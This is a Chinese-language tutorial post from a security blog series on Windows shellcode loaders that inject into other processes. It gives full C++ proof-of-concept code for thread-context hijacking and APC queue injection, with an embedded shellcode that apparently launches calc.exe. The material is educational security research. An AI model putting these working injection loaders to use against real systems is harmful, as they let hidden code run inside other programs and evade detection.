# 【Day 19】Shellcode 與他的快樂夥伴 (下) - Shellcode Loader

## 環境
* Windows 10 21H1
* Visual Studio 2019

## 前情提要
在上一篇[【Day 18】Shellcode 與他的快樂夥伴 (上) - Shellcode Loader](https://ithelp.ithome.com.tw/articles/10276699) 我們認識 Shellcode Loader 的用途，也講了幾個載入型的 Shellcode Loader，最後也提到這一篇會介紹幾個注入型的 Shellcode Loader。

載入與注入的差別在於載入型的 Shellcode Loader 是在當前 Process 載入並執行 Shellcode；而注入型的 Shellcode Loader 則是可以把要執行的 Shellcode 注入到其他 Process。

## Thread Hijack
### 原理
#### Snapshot Object
[Snapshot](https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes) 可以用來取得目前所在的 Process、Thread、Module、Heap，就像是對目前系統做快照。使用 [CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) 可以建立 Snapshot，然後就可以根據自己想要的資訊去使用它，不過權限是 Read Only。

例如我想取得 Thread 的資訊，可以呼叫 [Thread32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first) 取得 Snapshot 中第一個 Thread，然後用 [Thread32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next) 取得下一個 Thread 的資訊。

#### Context
每個 Thread 都有各自的 [Context](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context) 結構，不同的 Processor 也會有不同的 Context 結構。Context 中放的是一些暫存器的資訊，CPU 在執行程式時會用到它們。在程式中可以透過 [GetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) 取得目標 Thread Context，還有用 [SetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) 設定目標 Thread Context。

Context 中包含 Instruction Pointer，在 32-bit 使用 EIP，在 64-bit 使用 RIP，代表目前正要執行的程式位址。在[【Day 16】從一開始的 Anti-Debug 生活 - Anti-Debug](https://ithelp.ithome.com.tw/articles/10275614) 中我們也有用到 Context 結構做 Anti-Debug，不過那時候是看暫存器 DR0~DR3，檢查有沒有使用 Hardware Breakpoint。

### 利用
我們能使用 Snapshot 取得目標 Thread，又可以取得與設定 Thread Context，那就可以把目標 Thread 的 Instruction Pointer 改到我們的 Shellcode 執行。

注意在設定 Context 前，如果要讓 Process 在 Shellcode 執行完後不壞掉的話，要先用 [SuspendThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread) 讓它變 Suspended Thread，在改完 Context 之後再用 [ResumeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) 回復執行。因為我們的 Shellcode 最後是 `ret`，而我們是直接改 EIP，所以沒有 SuspendThread 的話，再執行 `ret` 時會跳到不是原本的位址或是不能執行的位址。但是假如只是想要執行 Shellcode，不用這兩行也可以。

另外執行 ResumeThread 後也不是馬上就開始執行，只是 Thread 的 Suspend Count 會減少，當減少為零時才會開始執行，所以實際測試時要等一下。

### 實作步驟
1. 取得目標 Process ID，因為是 x86 Shellcode，所以要找 32-bit Process。不能用 Current Process，不然後面 SuspendThread 會卡住自己
2. 開啟目標 Process，申請一塊記憶體後把 Shellcode 寫入目標 Process
3. 建立 Snapshot，取得 Process 與 Thread 的資訊
4. 迴圈跑過所有的 Thread，並篩選出目標 Process 中的 Thread
5. 開啟目標 Thread，將狀態改為 Suspended
6. 修改 Context 中的 EIP，改成我們的 Shellcode 位址
7. 讓 Thread 回復執行

### POC
程式專案可以參考我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/Shellcode%E8%88%87%E4%BB%96%E7%9A%84%E5%BF%AB%E6%A8%82%E5%A4%A5%E4%BC%B4/ShellcodeLoaderThreadHijack)。
```cpp=
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

int main()
{
    char shellcode[] = "\x50\x53\x51\x52\x56\x57\x55\x89\xE5\x83\xEC\x18\x31\xF6\x56\x68\x78\x65\x63\x00\x68\x57\x69\x6E\x45\x89\x65\xFC\x64\x8B\x1D\x30\x00\x00\x00\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0A\x40\x39\xD0\x72\xE5\x83\xC4\x24\xEB\x3F\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE6\x6A\x0A\x56\xFF\xD0\x83\xC4\x44\x5D\x5F\x5E\x5A\x59\x5B\x58\xC3";

    // 1. 取得目標 Process ID，因為是 x86 Shellcode，所以要找 32-bit Process
    // 不能用自己這個 Process，不然後面 SuspendThread 會卡住自己
    DWORD targetPID = 3776;
    HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);

    // 2. 開啟目標 Process，申請一塊記憶體後把 Shellcode 寫入目標 Process
    PVOID remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);

    // 3. 建立 Snapshot，取得 Process 與 Thread 的資訊
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);

    // 4. 迴圈跑過所有的 Thread，並篩選出目標 Process 中的 Thread
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);
    Thread32First(snapshot, &threadEntry);
    while (Thread32Next(snapshot, &threadEntry))
    {
        if (threadEntry.th32OwnerProcessID == targetPID)
        {
            // 5. 開啟目標 Thread，將狀態改為 Suspended
            HANDLE threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            SuspendThread(threadHijacked);

            // 6. 修改 Context 中的 EIP，改成我們的 Shellcode 位址
            CONTEXT context;
            context.ContextFlags = CONTEXT_FULL;
            GetThreadContext(threadHijacked, &context);
            context.Eip = (DWORD_PTR)remoteBuffer;
            SetThreadContext(threadHijacked, &context);

            // 7. 讓 Thread 回復執行
            ResumeThread(threadHijacked);
        }
    }
}
```

## APC Inject
### 原理
[APC](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)，全名 Asynchronous Procedure Call，是用來做非同步處理的。每個 Thread 都有一個 APC Queue，當目前這個 Thread 進入 Alertable 狀態時，會呼叫 APC Queue 中的每個 APC Function。Thread 可以透過呼叫 [SleepEx](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex)、 [SignalObjectAndWait](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-signalobjectandwait)、[MsgWaitForMultipleObjectsEx](https://docs.microsoft.com/en-us/windows/desktop/api/Winuser/nf-winuser-msgwaitformultipleobjectsex)、[WaitForMultipleObjectsEx](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjectsex)、[WaitForSingleObjectEx](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobjectex) 之類的等待函數進入 Alertable 狀態。

程式中可以透過 [QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc) 把 APC 排進目標 Thread 的 APC Queue，其中第一個參數可以設定它的 APC Function，第二個參數可以設定目標 Thread。

### 利用
既然我們知道 Thread 進入 Alertable 狀態時會執行 APC Function，那就可以在目標 Thread 排進一個 APC，設定它的 APC Function 為我們的 Shellcode。如此一來，當目標 Thread 進入 Alertable 狀態時就會執行 Shellcode。

### 實作步驟
1. 取得目標 Process ID，因為是 x86 Shellcode，所以要找 32-bit Process，這邊用當前的 Process 代替
2. 開啟目標 Process，申請一塊記憶體後把 Shellcode 寫入目標 Process
3. 建立 Process、Thread 快照，迴圈跑過所有 Thread，列舉所有在目標 Process 中的 Thread ID
4. 迴圈跑過所有目標 Process 中的 Thread，呼叫 QueueUserAPC 並把 APC Function 設為我們的 Shellcode
5. 呼叫 Sleep 讓當前的 Thread 進入 Alertable 狀態

### POC
程式專案可以參考我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/Shellcode%E8%88%87%E4%BB%96%E7%9A%84%E5%BF%AB%E6%A8%82%E5%A4%A5%E4%BC%B4/ShellcodeLoaderAPC)
```cpp=
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

int main()
{
    char shellcode[] = "\x50\x53\x51\x52\x56\x57\x55\x55\x89\xE5\x83\xEC\x18\x31\xF6\x56\x68\x78\x65\x63\x00\x68\x57\x69\x6E\x45\x89\x65\xFC\x64\x8B\x1D\x30\x00\x00\x00\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0A\x40\x39\xD0\x72\xE5\x83\xC4\x26\xEB\x3F\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE6\x6A\x0A\x56\xFF\xD0\x83\xC4\x46\x5D\x5F\x5E\x5A\x59\x5B\x58\xC3";

    // 1. 取得目標 Process ID，因為是 x86 Shellcode，所以要找 32-bit Process，這邊用當前的 Process 代替
    DWORD pid = GetCurrentProcessId();

    // 2. 開啟目標 Process，申請一塊記憶體後把 Shellcode 寫入目標 Process
    HANDLE victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(victimProcess, shellAddress, shellcode, sizeof(shellcode), NULL);

    // 3. 建立 Process、Thread 快照，迴圈跑過所有 Thread，列舉所有在目標 Process 中的 Thread ID
    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    std::vector<DWORD> threadIds;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (Thread32First(snapshot, &threadEntry))
    {
        do {
            if (threadEntry.th32OwnerProcessID == pid)
            {
                threadIds.push_back(threadEntry.th32ThreadID);
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    // 4. 迴圈跑過所有目標 Process 中的 Thread，呼叫 QueueUserAPC 並把 APC Function 設為我們的 Shellcode
    for (DWORD threadId : threadIds)
    {
        HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
        QueueUserAPC((PAPCFUNC)shellAddress, threadHandle, NULL);
    }

    // 5. 呼叫 Sleep 讓當前的 Thread 進入 Alertable 狀態
    Sleep(1000);
    return 0;
}
```

## 其他
還有其他的注入型 Shellcode Loader 可以點選參考資料玩玩看。

## 參考資料
* [如何实现一款 shellcodeLoader](https://paper.seebug.org/1413/#apc)
* [knownsec/shellcodeloader](https://github.com/knownsec/shellcodeloader)
